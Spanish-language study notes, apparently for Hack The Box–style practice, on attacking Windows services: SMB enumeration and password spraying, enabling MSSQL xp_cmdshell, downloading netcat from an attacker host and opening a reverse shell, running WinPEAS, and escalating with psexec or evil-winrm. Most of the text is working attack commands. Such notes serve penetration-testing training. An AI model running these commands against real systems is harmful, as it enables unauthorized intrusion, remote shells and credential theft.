
> [!info] Relacionado con
> [[Metodología de Explotación]] · [[Escalada de Privilegios]] · [[Reverse Shells y Post-Explotación]] · [[Prácticas CTF - HTB y VulnHub]]

---

## ① SMB — Enumeración y acceso

Puerto **445**. Protocolo de compartición de archivos de Windows.

```bash
# Listar shares (sesión nula)
smbclient -N -L //<IP>

# Ver permisos
netexec smb <IP> -u '' -p '' --shares

# Conectarse a un share
smbclient //<IP>/tmp -N
ls
get <fichero>
put <fichero>

# Enumeración completa
enum4linux <IP>

# Password spraying
netexec smb <IP> -u usuarios.txt -p 'admin' --continue-on-success
```

> [!tip] CONTEXTO
> SMB/Samba es uno de los protocolos más utilizados en entornos corporativos y uno de los más explotados. Eternal Blue (MS-17-010) es el ejemplo más conocido.

---

## ② MSSQL — Acceso y xp_cmdshell

Puerto **1433**.

```bash
# Conectar con [[SMB_Impacket|Impacket]]
impacket-mssqlclient NOMBREMAQUINA/usuario@IP -windows-auth

# Comprobar si somos sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin'); -- devuelve 1 = sí

# Activar xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Ejecutar comandos del sistema
EXEC xp_cmdshell 'whoami';
```

> [!important] xp_cmdshell
> Permite ejecutar comandos del SO Windows **desde la consola de SQL**. Es la vía para "escapar" de SQL hacia una shell real.

---

## ③ Transferencia de archivos

```bash
# En tu Kali: servidor HTTP
python3 -m http.server 80

# En la víctima (vía xp_cmdshell)
EXEC xp_cmdshell 'powershell wget http://10.10.15.82/nc64.exe -OutFile C:\Users\Public\nc64.exe';

# Netcat reverse shell
nc -lvnp 4444 # en Kali
EXEC xp_cmdshell 'C:\Users\Public\nc64.exe -e cmd.exe 10.10.15.82 4444';
```

> [!warning] PowerShell vs CMD
> `wget` en este contexto es un alias de **PowerShell**; falla si se lanza en CMD pura. Descargar con PowerShell, ejecutar con CMD.

---

## ④ Enumeración automatizada: WinPEAS

```bash
# Descargar
powershell wget http://10.10.15.82/winPEASx64.exe -OutFile winpeas.exe
.\winpeas.exe
```

**Resultado:** informe con colores. **Lo rojo es lo más importante.**

> [!tip] HALLAZGO CLÁSICO
> WinPEAS detecta el historial de PowerShell del usuario. Si aparece un comando de backup con credenciales en texto claro → esas credenciales funcionan para escalar.

---

## ⑤ Escalada final

```bash
# Con credenciales de Administrator
[[SMB_Impacket|impacket-psexec]] administrator:'CONTRASEÑA'@IP

# Alternativa
evil-winrm -i IP -u administrator -p 'CONTRASEÑA'
```

---

## ⑥ [[SMB_Impacket|Impacket]] — Suite de herramientas

| Herramienta | Función |
|------------|---------|
| `psexec.py` | Ejecución remota de comandos |
| `smbexec.py` | Ejecución vía SMB |
| `secretsdump.py` | Vuelca hashes del dominio |
| `mssqlclient.py` | Cliente MSSQL |

---

## Checklist de repaso

- [ ] ¿Sé enumerar SMB con smbclient y enum4linux?
- [ ] ¿Puedo conectarme a MSSQL con [[SMB_Impacket|Impacket]]?
- [ ] ¿Sé activar y usar xp_cmdshell?
- [ ] ¿Entiendo la diferencia entre PowerShell y CMD para transferir archivos?
- [ ] ¿Sé interpretar el informe de WinPEAS?
- [ ] ¿Puedo escalar con [[SMB_Impacket|psexec.py]] o evil-winrm?

---

## Enlaces relacionados

- [[comandos/SMB_Impacket]] — Cheat sheet de comandos
- [[comandos/John_Hashcat]] — Cheat sheet de comandos



---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes evolve/BLOQUE 5.md|BLOQUE 5]] — Linux, VulnHub, Windows
- [[Escalada de Privilegios.md|Escalada de Privilegios]] — Linux, VulnHub, Windows
- [[Explotación de Servicios - Linux.md|Explotación de Servicios - Linux]] — Linux, VulnHub, Windows
- [[../../apuntes Joselu/MODULO3/resumen_master_clase34.md|resumen_master_clase34]] — Linux, VulnHub, Windows
- [[../../apuntes Andres/12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype.md|12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype]] — Linux, VulnHub, Windows
- [[Explotación de Máquinas Locales I — Oopsie y Archetype.md|Explotación de Máquinas Locales I — Oopsie y Archetype]] — Linux, VulnHub, Windows

### 🛠️ Herramientas

- [[comandos/Metasploit|Metasploit]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/SMB_Impacket|SMB / Impacket]]

> #escalada-privilegios #hack-the-box #linux #metasploit #netcat #pentest #post-explotacion #redes #reverse-shell #smb-impacket #vulnhub #windows
